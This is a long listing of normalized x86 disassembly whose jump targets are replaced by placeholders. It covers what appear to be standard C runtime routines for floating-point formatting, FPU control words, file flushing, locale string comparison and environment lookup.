jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ax 0x3fbf
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
cmp ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x60 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
cmp edx esi
mov [ ebp - 0x44 ] edx
jb r-xdata
inc eax
inc eax
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x48 ] edx
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
cmp ebx ecx
mov eax [ ebp - 0x60 ]
jae r-xdata
inc ecx
test edx edx
mov esi eax
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov edx [ ebp - 0x54 ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add edi 0xc002
xor eax eax
cmp di ax
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx edx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp di si
jne r-xdata
inc eax
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
and [ eax ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add edi 0xffff
cmp di ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x48 ] 0x2
sub [ ebp - 0x5c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ eax ]
cmp [ ebp - 0x44 ] 0x0
mov [ eax - 0x4 ] ebx
je r-xdata
lea edi [ ebp - 0xc ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] 0x5
mov edx [ ebp - 0x64 ]
inc eax
test [ edx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
cmp di ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add ebx ebx
or ebx edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add edi 0xffff
cmp di ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x48 ]
movzx esi [ esi ]
movzx edx [ edx ]
and [ ebp - 0x44 ] 0x0
imul edx esi
mov esi [ eax - 0x4 ]
lea ebx [ esi + edx ]
cmp ebx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x5c ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] edi
jg r-xdata
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x64 ]
add edx 0x8
mov [ ebp - 0x54 ] edx
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr ebx 0x1
or ebx edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x58 ]
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add eax 0xc002
test ax ax
jle r-xdata
mov [ ebp - 0x70 ] 0x1
cmp esi edx
jae r-xdata
cmp [ edx ] esi
jne r-xdata
mov [ ebp - 0x16 ] si
jmp r-xdata
inc [ ebp - 0xe ]
cmp [ ebp - 0xa ] 0xffffffff
mov [ ebp - 0xe ] eax
jne r-xdata
cmp di 0x7fff
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
xor eax eax
cmp [ ebp - 0x58 ] eax
je r-xdata
add eax 0xffff
test ax ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x58 ] 0x2
sub [ ebp - 0x54 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x70 ] 0x0
mov edi [ ebp - 0x44 ]
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov ax [ ebp - 0xe ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
or edi ecx
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
neg cx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
cmp [ ebp - 0x6 ] 0xffff
mov [ ebp - 0xa ] eax
jne r-xdata
or [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov edx eax
neg edx
movzx edx dx
mov [ ebp - 0x44 ] edx
add eax edx
test ax ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add edi edi
or edi edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add eax 0xffff
test ax ax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x58 ]
mov esi [ ebp - 0x54 ]
movzx esi [ esi ]
movzx edx [ edx ]
mov edi [ edi - 0x4 ]
imul edx esi
and [ ebp - 0x70 ] 0x0
lea esi [ edi + edx ]
cmp esi edi
jb r-xdata
xor eax eax
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc edi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr edi 0x1
or edi edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec [ ebp - 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
mov dx [ ebp - 0xe ]
mov [ ebp - 0x20 ] dx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x1e ] edx
mov edx [ ebp - 0x8 ]
or eax ecx
mov [ ebp - 0x1a ] edx
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] 0xffff
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc eax
jmp r-xdata
sub_41f46f
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_41f4fd
xor eax eax
test dl 0x10
je r-xdata
test dl 0x8
push ebx
push esi
push edi
mov ebx 0x200
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
test edx 0x80000
mov edi 0x100
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
cmp edx 0x1000000
pop esi
pop ebx
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_41f59d
sub esp 0x10
push ebx
push ebp
push esi
push edi
fwait
fnstcw [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov edi 0xc00
and eax edi
mov ebp 0x300
mov esi 0x200
je r-xdata
or edx 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx esi
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov eax esi
not eax
and eax edx
and ecx esi
or eax ecx
cmp eax edx
mov [ esp + 0x1c ] eax
je r-xdata
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx esi
jmp r-xdata
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx eax
call sub_41f46f
movzx eax ax
mov [ esp + 0x10 ] eax
fldcw [ esp + 0x10 ]
fwait
fnstcw [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
xor edx edx
test bl 0x1
je r-xdata
or edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
and esi 0x308031f
mov edi esi
stmxcsr [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
xor esi esi
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test ax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test ax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test ax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test ax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test ax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebp 0x6000
and ecx ebp
je r-xdata
or esi 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ esp + 0x1c ] edx
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
call sub_41f4fd
push eax
mov [ esp + 0x2c ] eax
call sub_42049d
pop ecx
stmxcsr [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
xor edx edx
test al al
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebp
jne r-xdata
or edx ebp
jmp r-xdata
mov edi 0x200
test edi eax
je r-xdata
push 0x10
pop edx
mov ecx [ esp + 0x1c ]
mov edx eax
xor edx ecx
or eax ecx
test edx 0x8031f
je r-xdata
mov edx edi
and edi [ esp + 0x24 ]
not edx
and edx esi
or edx edi
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ax 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ax 0x800
je r-xdata
or edx 0x4
test ax 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi eax
je r-xdata
or edx 0x1
mov ecx eax
and ecx ebp
je r-xdata
or edx 0x80000
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x2000000
sub eax 0x7fc0
je r-xdata
or edx esi
cmp ecx 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or edx edi
jmp r-xdata
cmp ecx ebp
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_41f8bf
mov eax [ rw-data ]
cmp eax 0xffffffff
push esi
mov esi [ CloseHandle@IAT ]
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_41f8ec
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_411077
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_41d457
push esi
mov ebx eax
call sub_420670
push esi
call sub_41b6c0
push eax
call sub_4205a3
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_40f613
pop ecx
mov [ esi + 0x1c ] edi
sub_41f95f
push 0xc
push r--data
call sub_4106dc
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_411077
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_41b61c
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_41f8ec
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f9d3
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_410721
retn
mov eax [ ebp - 0x1c ]
sub_41f9db
push 0x10
push r--data
call sub_4106dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_411077
mov [ eax ] 0x9
call sub_411077
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413fad
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_410721
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ edi ]
movzx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41d234
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_411077
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_41d1c3
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41fab2
mov eax [ ebp - 0x1c ]
call sub_41108a
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_41fabc
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add [ ebp + 0x10 ] eax
inc eax
cmp ecx edi
jne r-xdata
mov [ rw-data ] 0x2
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
mov ecx edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
or eax 0xffffffff
sub eax ecx
add edx eax
mov [ ebp + 0x18 ] edx
jmp r-xdata
inc eax
cmp ecx edi
jne r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_41d776
mov esi eax
cmp esi 0xffffffff
pop ecx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
cmp [ ebp + 0x1c ] edi
mov [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
test ebx ebx
mov esi eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_41d7bd
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_40f613
push edi
call sub_40f613
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_41d7bd
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
cmp ebx edi
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_40f613
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
test ebx ebx
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_41c221
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_40f80e
test eax eax
pop ecx
je r-xdata
call sub_411010
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_41c221
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_40f80e
test eax eax
pop ecx
je r-xdata
call sub_411010
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_41fe45
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41fabc
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41fe85
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_41fe45
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d96f
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_411077
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41ff7d
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ esp + 0x10 ]
call sub_41d6ca
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
pop esi
sar eax 0x2
neg eax
retn
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
pop esi
sar eax 0x2
retn
test al al
je r-xdata
sub_41ffca
push ebp
mov ebp esp
push ecx
xor eax eax
test edi edi
mov ecx edi
jne r-xdata
cmp [ edi ] eax
je r-xdata
leave
retn
push ebx
push esi
inc eax
push 0x4
push eax
call sub_4174d9
mov esi eax
test esi esi
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx edi
jmp r-xdata
push 0x9
call sub_412f6d
pop ecx
test eax eax
jne r-xdata
push eax
call sub_41127b
mov [ esi ] eax
add esi 0x4
add ebx 0x4
mov eax [ ebx ]
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn
sub_420027
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
